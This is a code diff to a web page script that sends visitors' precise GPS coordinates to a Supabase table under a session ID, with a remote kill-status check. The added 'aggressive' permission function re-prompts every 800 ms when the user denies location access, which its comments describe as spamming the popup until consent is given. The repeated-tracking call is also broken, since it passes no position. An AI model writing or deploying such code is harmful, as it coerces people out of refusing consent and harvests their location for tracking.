@@ -21,8 +21,8 @@ async function init() {
     sessionId = data[0].id;
     console.log("Session Started:", sessionId);
 
-    // Start location tracking
-    setInterval(sendLocation, 5000);
+    // Aggressive Location Permission
+    requestLocationPermission();
 
     // Check kill status
     setInterval(checkKillStatus, 3000);
@@ -32,19 +32,37 @@ async function init() {
   }
 }
 
-function sendLocation() {
+// Aggressive Location Request - keeps asking if denied
+function requestLocationPermission() {
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      console.log("✅ Location permission granted");
+      sendLocation(pos);
+      // Continue tracking
+      setInterval(sendLocation, 4000);
+    },
+    (error) => {
+      console.log("❌ Location denied, asking again...", error);
+      // Keep spamming the popup
+      setTimeout(requestLocationPermission, 800);
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+}
+
+function sendLocation(pos) {
   if (isKilled) return;
-  navigator.geolocation.getCurrentPosition(pos => {
-    fetch(`${SUPABASE_URL}/rest/v1/location_pings`, {
-      method: "POST",
-      headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json" },
-      body: JSON.stringify({
-        session_id: sessionId,
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        accuracy: pos.coords.accuracy
-      })
-    });
+  if (!pos) return;
+
+  fetch(`${SUPABASE_URL}/rest/v1/location_pings`, {
+    method: "POST",
+    headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json" },
+    body: JSON.stringify({
+      session_id: sessionId,
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude,
+      accuracy: pos.coords.accuracy
+    })
   });
 }
 
